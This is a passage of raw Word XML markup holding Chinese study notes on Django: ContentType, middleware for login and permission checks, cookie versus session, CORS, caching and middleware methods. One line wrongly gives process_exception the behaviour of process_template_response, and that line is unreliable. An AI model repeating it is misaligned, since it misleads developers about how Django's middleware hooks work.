        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">ContentType </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41531BF2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>contenttype是django的一个组件（app），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1130B1C5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>为我们找到django程序中所有app中的所有表并添加到记录中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A60FF1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可以使用他再加上表中的两个字段实现：一张表和N张表创建FK关系。 - 字段：表名称 - 字段：数据行ID </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="244EA0C3" w14:textId="142092A2" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>应用：路飞表结构优惠券和专题课和学位课关联。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777A2B2F" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAE13E1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>对所有的请求进行批量处理，在视图函数执行前后进行自定义操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7E0978" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>应用：用户登录校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C20C64" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>问题：为甚么不使用装饰器？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D79BD1" w14:textId="3D3E2945" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>如果不使用中间件，就需要给每个视图函数添加装饰器，太繁琐</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E817092" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>权限组件:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178D7FEB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>用户登录后，将权限放到session中，然后再每次请求进来在中间件里，根据当前的url去session中匹配，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C89477" w14:textId="73622760" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>判断当前用户是否有权限访问当前url,有权限就继续访问，没有就返回，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F463C9" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"> （检查的东西就可以放到中间件中进行统一处理）在process_request方法里面做的，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DFA196" w14:textId="086E1689" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　我们的中间件是放在session后面，因为中间件需要到session里面取数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C46DF1E" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EA63C2" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>cookie与session区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D370FB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>（a）cookie是保存在浏览器端的键值对，而session是保存的服务器端的键值对，但是依赖cookie。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C01C57F" w14:textId="2A711F88" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>（也可以不依赖cookie，可以放在url，或请求头但是cookie比较方便）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D68F8B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>（b）以登录为例，cookie为通过登录成功后，设置明文的键值对，并将键值对发送客户端存，明文信息可能存在泄漏，不安全；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B025F91" w14:textId="5AA23F73" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　session则是生成随机字符串，发给用户，并写到浏览器的cookie中，同时服务器自己也会保存一份。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF4D0D1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>（c）在登录验证时，cookie：根据浏览器发送请求时附带的cookie的键值对进行判断，如果存在，则验证通过；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE5A5F8" w14:textId="5F1976F0" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　session：在请求用户的cookie中获取随机字符串，根据随机字符串在session中获取其对应的值进行验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011CDE3C" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>cors跨域（场景：前后端分离时，本地测试开发时使用）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B864DAE" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>如果网站之间存在跨域，域名不同，端口不同会导致出现跨域，但凡出现跨域，浏览器就会出现同源策略的限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563D5260" w14:textId="0F6EC503" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>解决：在我们的服务端给我们响应数据，加上响应头---&gt; 在中间件加的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186FB123" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">缓存/   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5084D9B8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>常用的数据放在缓存里面，就不用走视图函数，请求进来通过所有的process_request,会到缓存里面查数据，有就直接拿，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC02CF6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　没有就走视图函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C756CD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　关键点：1：执行完所有的process_request才去缓存取数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098E12A2" w14:textId="1D899935" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　　　　　2：执行完所有的process_response才将数据放到缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6D7797" w14:textId="53260172" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00652BA5" w:rsidP="00652BA5">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>21</w:t>
      </w:r>
      <w:r w:rsidRPr="00652BA5">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关于缓存问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4491B22C" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>1:为什么放在最后一个process_request才去缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A412EC6" w14:textId="39468198" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>因为需要验证完用户的请求，才能返回数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01AC1E8D" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>2:什么时候将数据放到缓存中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="431CB8AD" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>第一次走中间件，缓存没有数据，会走视图函数，取数据库里面取数据，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0787BBEC" w14:textId="5BE7574C" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>当走完process_response,才将数据放到缓存里，因为，走process_response的时候可能给我们的响应加处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D41054D" w14:textId="1FFEC8AE" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00652BA5" w:rsidP="00652BA5">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>22</w:t>
      </w:r>
      <w:r w:rsidRPr="00652BA5">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为什么使用缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4275607F" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>将常用且不太频繁修改的数据放入缓存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C03B5FD" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>以后用户再来访问，先去缓存查看是否存在，如果有就返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25697A30" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>否则，去数据库中获取并返回给用户（再加入到缓存，以便下次访问）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A813DA8" w14:textId="78B455A5" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00D92594"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023</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列举</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中间件的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>个方法？以及</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中间件的应用场景？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B27350B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>process_request(self,request)  先走request 通过路由匹配返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2AA6C3" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>process_view(self, request, callback, callback_args, callback_kwargs) 再返回执行view</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714C506B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>process_template_response(self,request,response)   当视图函数的返回值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B600F3" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>process_exception(self, request, exception)  当视图函数的返回值对象中有render方法时，该方法才会被调用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4F294B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
